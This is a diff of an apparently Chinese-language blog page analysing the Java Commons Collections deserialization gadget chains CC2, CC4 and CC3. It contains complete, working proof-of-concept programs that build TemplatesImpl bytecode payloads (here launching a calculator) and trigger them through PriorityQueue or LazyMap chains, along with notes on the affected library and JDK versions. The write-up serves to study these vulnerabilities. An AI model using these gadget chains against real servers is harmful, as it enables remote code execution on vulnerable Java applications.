+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>queue</strong>和 <strong>comparator</strong>是我们需要构造的两个大头，这里<strong>queue</strong>需要通过反射构造，因为正常构造需要满足类型一致。所以后续我们还需要手动修改<strong>queue</strong>的大小为2，这点在前面也有说过。</p>
+
+<p>这里的调用有点麻烦，不过如果你调试一遍也还算明了，总的来说就是：</p>
+
+<p><img src="../../assets/images/image-20220222224204473.png" alt="image-20220222224204473" /></p>
+
+<p>成功走到<code class="language-plaintext highlighter-rouge">TemplatesImpl.newTransformer()</code>，至此，cc2结束。</p>
+
+<h2 id="cc-4">CC 4</h2>
+
+<h3 id="利用条件-2">利用条件</h3>
+
+<p>同 cc2</p>
+
+<ul>
+  <li><strong>commons-collections4: 4.0</strong></li>
+  <li>jdk 版本暂无限制</li>
+</ul>
+
+<h3 id="完整poc-5">完整Poc</h3>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+
+        <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">ClassClassPath</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+        <span class="nc">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"Cat"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\"open  -a Calculator\");"</span><span class="o">;</span>
+        <span class="c1">// 创建 static 代码块，并插入代码</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">randomClassName</span> <span class="o">=</span> <span class="s">"EvilCat"</span> <span class="o">+</span> <span class="nc">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">randomClassName</span><span class="o">);</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span> <span class="c1">//设置父类为AbstractTranslet，避免报错</span>
+
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">targetByteCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">classBytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="n">targetByteCodes</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"name"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="cm">/**
+         * TrAXFilter 构造函数能直接触发 所以不用利用 invoke 那个
+         */</span>
+        <span class="nc">ChainedTransformer</span> <span class="n">chain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]</span> <span class="o">{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">})</span>
+        <span class="o">});</span>
+
+        <span class="nc">TransformingComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TransformingComparator</span><span class="o">(</span><span class="n">chain</span><span class="o">);</span>
+        <span class="nc">PriorityQueue</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">(</span><span class="mi">2</span><span class="o">,</span><span class="n">comparator</span><span class="o">);</span>
+
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span><span class="s">"size"</span><span class="o">,</span><span class="mi">2</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">queue</span><span class="o">,</span><span class="s">"comparator"</span><span class="o">,</span><span class="n">comparator</span><span class="o">);</span>
+
+        <span class="nc">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC4Poc.bin"</span><span class="o">));</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">queue</span><span class="o">);</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC4Poc.bin"</span><span class="o">));</span>
+        <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h3 id="利用链分析">利用链分析</h3>
+
+<p>CC4 『 kick - off 』的起点与 CC2 相同，还是优先级队列。Sink的终点也相同，<code class="language-plaintext highlighter-rouge">TemplatesImpl.newTransformer()</code>。不同的是CC2使用了<code class="language-plaintext highlighter-rouge">InvokerTransformer.transform(intput)</code>反射调用<code class="language-plaintext highlighter-rouge">TemplatesImpl.newTransformer()</code>，而CC4则使用了<code class="language-plaintext highlighter-rouge">InstantiateTransformer.transform(input)</code> 生成 <strong>TrAXFilter</strong>对象，其构造函数自动调用<code class="language-plaintext highlighter-rouge">TemplatesImpl.newTransformer()</code>。</p>
+
+<h4 id="traxfilter">TrAXFilter</h4>
+
+<p>在 <strong>TrAXFilter</strong>类的构造器中，会调用可控参数的<code class="language-plaintext highlighter-rouge">templates.newTransformer()</code>。那么我们现在只需要一个实例化对象的入口就行了。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="nf">TrAXFilter</span><span class="o">(</span><span class="nc">Templates</span> <span class="n">templates</span><span class="o">)</span>  <span class="kd">throws</span>
+    <span class="nc">TransformerConfigurationException</span>
+<span class="o">{</span>
+    <span class="n">_templates</span> <span class="o">=</span> <span class="n">templates</span><span class="o">;</span>
+    <span class="n">_transformer</span> <span class="o">=</span> <span class="o">(</span><span class="nc">TransformerImpl</span><span class="o">)</span> <span class="n">templates</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">();</span>
+    <span class="n">_transformerHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TransformerHandlerImpl</span><span class="o">(</span><span class="n">_transformer</span><span class="o">);</span>
+    <span class="n">_useServicesMechanism</span> <span class="o">=</span> <span class="n">_transformer</span><span class="o">.</span><span class="na">useServicesMechnism</span><span class="o">();</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h4 id="instantiatetransformer">InstantiateTransformer</h4>
+
+<p>迷人的<code class="language-plaintext highlighter-rouge">transform()</code>，创建 <strong>TrAXFilter</strong>实例对象，并把 <strong>TemplatesImpl</strong>传入，完美。</p>
+
+<p><img src="../../assets/images/image-20220301114145057.png" alt="image-20220301114145057" /></p>
+
+<h3 id="完整调用链">完整调用链</h3>
+
+<p><img src="../../assets/images/image-20220301115133949.png" alt="image-20220301115133949" /></p>
+
+<p>和CC2相比只是在<code class="language-plaintext highlighter-rouge">transform()</code>的选择上有所不同。</p>
+
+<h2 id="cc3">CC3</h2>
+
+<h4 id="利用条件-3">利用条件</h4>
+
+<p>同CC1</p>
+
+<ul>
+  <li><strong>cc3.1～3.2.1</strong></li>
+  <li><strong>jdk 1.7</strong>(8u71之前都可以)</li>
+</ul>
+
+<p>CC3 == CC1 + CC4，那么就明白为什么对JDK版本有所限制了。</p>
+
+<h4 id="完整poc-6">完整Poc</h4>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">ClassPool</span> <span class="n">pool</span> <span class="o">=</span> <span class="nc">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">();</span>
+        <span class="n">pool</span><span class="o">.</span><span class="na">insertClassPath</span><span class="o">(</span><span class="k">new</span> <span class="nc">ClassClassPath</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
+        <span class="nc">CtClass</span> <span class="n">cc</span> <span class="o">=</span> <span class="n">pool</span><span class="o">.</span><span class="na">makeClass</span><span class="o">(</span><span class="s">"Cat"</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="s">"java.lang.Runtime.getRuntime().exec(\"open  -a Calculator\");"</span><span class="o">;</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">makeClassInitializer</span><span class="o">().</span><span class="na">insertBefore</span><span class="o">(</span><span class="n">cmd</span><span class="o">);</span>
+        <span class="nc">String</span> <span class="n">randomClassName</span> <span class="o">=</span> <span class="s">"EvilCat"</span> <span class="o">+</span> <span class="nc">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">randomClassName</span><span class="o">);</span>
+        <span class="n">cc</span><span class="o">.</span><span class="na">setSuperclass</span><span class="o">(</span><span class="n">pool</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">AbstractTranslet</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getName</span><span class="o">()));</span> <span class="c1">//设置父类为AbstractTranslet，避免报错</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">classBytes</span> <span class="o">=</span> <span class="n">cc</span><span class="o">.</span><span class="na">toBytecode</span><span class="o">();</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">targetByteCodes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[][]{</span><span class="n">classBytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="nc">TemplatesImpl</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_bytecodes"</span><span class="o">,</span> <span class="n">targetByteCodes</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_name"</span><span class="o">,</span> <span class="s">"name"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span> <span class="s">"_class"</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+
+        <span class="nc">ChainedTransformer</span> <span class="n">chain</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Transformer</span><span class="o">[]</span> <span class="o">{</span>
+                <span class="k">new</span> <span class="nf">ConstantTransformer</span><span class="o">(</span><span class="nc">TrAXFilter</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+                <span class="k">new</span> <span class="nf">InstantiateTransformer</span><span class="o">(</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Templates</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">})</span>
+        <span class="o">});</span>
+
+        <span class="nc">HashMap</span> <span class="n">innermap</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">();</span>
+        <span class="nc">LazyMap</span> <span class="n">map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">LazyMap</span><span class="o">)</span><span class="nc">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innermap</span><span class="o">,</span><span class="n">chain</span><span class="o">);</span>
+
+
+        <span class="nc">Constructor</span> <span class="n">handler_constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">handler_constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">InvocationHandler</span> <span class="n">map_handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span> <span class="n">handler_constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">map</span><span class="o">);</span>
+        <span class="nc">Map</span> <span class="n">proxy_map</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Map</span><span class="o">)</span> <span class="nc">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="nc">ClassLoader</span><span class="o">.</span><span class="na">getSystemClassLoader</span><span class="o">(),</span><span class="k">new</span> <span class="nc">Class</span><span class="o">[]{</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">},</span><span class="n">map_handler</span><span class="o">);</span>
+
+
+        <span class="nc">Constructor</span> <span class="n">AnnotationInvocationHandler_Constructor</span> <span class="o">=</span> <span class="nc">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"sun.reflect.annotation.AnnotationInvocationHandler"</span><span class="o">).</span><span class="na">getDeclaredConstructor</span><span class="o">(</span><span class="nc">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="nc">Map</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+        <span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="nc">InvocationHandler</span> <span class="n">handler</span> <span class="o">=</span> <span class="o">(</span><span class="nc">InvocationHandler</span><span class="o">)</span><span class="n">AnnotationInvocationHandler_Constructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="nc">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span><span class="n">proxy_map</span><span class="o">);</span>
+
+        <span class="nc">ObjectOutputStream</span> <span class="n">outputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"bin/CC2Poc.bin"</span><span class="o">));</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">handler</span><span class="o">);</span>
+        <span class="n">outputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+
+        <span class="nc">ObjectInputStream</span> <span class="n">inputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="s">"bin/CC2Poc.bin"</span><span class="o">));</span>
+        <span class="n">inputStream</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+
+    <span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="kd">final</span> <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Field</span> <span class="nf">getField</span><span class="o">(</span><span class="kd">final</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">,</span> <span class="kd">final</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">field</span> <span class="o">=</span> <span class="n">clazz</span><span class="o">.</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+            <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">catch</span> <span class="o">(</span><span class="nc">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">()</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span>
+                <span class="n">field</span> <span class="o">=</span> <span class="n">getField</span><span class="o">(</span><span class="n">clazz</span><span class="o">.</span><span class="na">getSuperclass</span><span class="o">(),</span> <span class="n">fieldName</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="k">return</span> <span class="n">field</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>在CC4中，使用 <code class="language-plaintext highlighter-rouge">TransformingComparator.compare()</code>走到了<code class="language-plaintext highlighter-rouge">ChainedTransformer.transform()</code>，而CC3延续了CC1的<code class="language-plaintext highlighter-rouge">LazyMap.get()</code>，进行了拼接。实际上CC5 6 7都可以进行拼接，这相当于提供了一个思路，把CC链的版本从4降到了3。</p>
+
+<h2 id="后记">后记</h2>
+
+<p>学好数据结构，基本功决定上限。</p>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2022-10-28T11:45:07+08:00"><!-- start custom article footer snippet -->
 
 <!-- end custom article footer snippet -->
 </footer>
-<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/java/deserialize/URLDNS">URLDNS</a></div></div></div>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/java/deserialize/URLDNS">URLDNS</a></div><div class="next"><span>NEXT</span><a href="/java/deserialize/7u21">7u21</a></div></div></div>
 
 </div>
 
@@ -1399,7 +2217,23 @@ var6: fakevalue
   });
 })();
 </script>
-</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+</div><section class="page__comments d-print-none"><div id="disqus_thread"></div>
+  <script>
+  /**
+  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+  var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/java/deserialize/CommonsCollections';
+    this.page.identifier = 'CommonsCollections';
+  };
+  (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://theoyu.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+  })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></section></article><!-- start custom main bottom snippet -->
 
 <!-- end custom main bottom snippet -->
 </div>
@@ -1411,7 +2245,7 @@ var6: fakevalue
       <a class="button button--circle mail-button" itemprop="email" href="mailto:zeyu.ou@foxmail.com" target="_blank">
         <i class="fas fa-envelope"></i>
       </a><li title="Follow me on Github.">
-        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/https://github.com/yuuuuu422" target="_blank">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/yuuuuu422" target="_blank">
           <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
   <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
 </svg>
@@ -2038,7 +2872,13 @@ window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
     window.pageAsideAffix = affix;
   });
 })();
+</script><script type="text/x-mathjax-config">
+	var _config = { tex2jax: {
+		inlineMath: [['$','$'], ['\\(','\\)']]
+	}};MathJax.Hub.Config(_config);
 </script>
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+
     </div>
     <script>(function () {
   var $root = document.getElementsByClassName('root')[0];
